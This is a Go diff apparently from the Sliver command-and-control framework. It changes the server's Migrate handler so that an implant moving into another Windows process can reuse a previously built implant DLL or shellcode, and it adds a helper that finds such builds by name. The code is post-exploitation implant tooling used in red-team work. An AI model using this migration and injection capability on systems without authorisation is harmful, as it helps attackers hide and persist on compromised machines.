@@ -45,21 +45,22 @@ func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.T
 
 // Migrate - Migrate to a new process on the remote system (Windows only)
 func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
+	var shellcode []byte
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
-
-	config := generate.ImplantConfigFromProtobuf(req.Config)
-	config.Format = clientpb.ImplantConfig_SHARED_LIB
-	config.ObfuscateSymbols = false
-	dllPath, err := generate.SliverSharedLibrary(config)
-	if err != nil {
-		return nil, err
-	}
-	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
-	if err != nil {
-		return nil, err
+	if sliverData, err := getPreviousSliverDll(req.Config.GetName()); err == nil {
+		shellcode, err = generate.ShellcodeRDIFromBytes(sliverData, "", "")
+	} else {
+		config := generate.ImplantConfigFromProtobuf(req.Config)
+		config.Format = clientpb.ImplantConfig_SHARED_LIB
+		config.ObfuscateSymbols = false
+		dllPath, err := generate.SliverSharedLibrary(config)
+		if err != nil {
+			return nil, err
+		}
+		shellcode, err = generate.ShellcodeRDI(dllPath, "", "")
 	}
 	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
 		Request: req.Request,
@@ -177,4 +178,31 @@ func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.SpawnDllReq) (*sl
 		return nil, err
 	}
 	return resp, nil
+}
+
+// Utility functions
+
+func getPreviousSliverDll(name string) ([]byte, error) {
+	var data []byte
+	// get implants builds
+	configs, err := generate.ImplantConfigMap()
+	if err != nil {
+		return data, err
+	}
+
+	// get the implant with the same name
+	if conf, ok := configs[name]; ok {
+		if conf.Format == clientpb.ImplantConfig_SHARED_LIB || conf.Format == clientpb.ImplantConfig_SHELLCODE {
+			fileData, err := generate.ImplantFileByName(name)
+			if err != nil {
+				return data, err
+			}
+			data = fileData
+		} else {
+			err = fmt.Errorf("no existing DLL or shellcode found")
+		}
+	} else {
+		err = fmt.Errorf("no sliver found with this name")
+	}
+	return data, err
 }
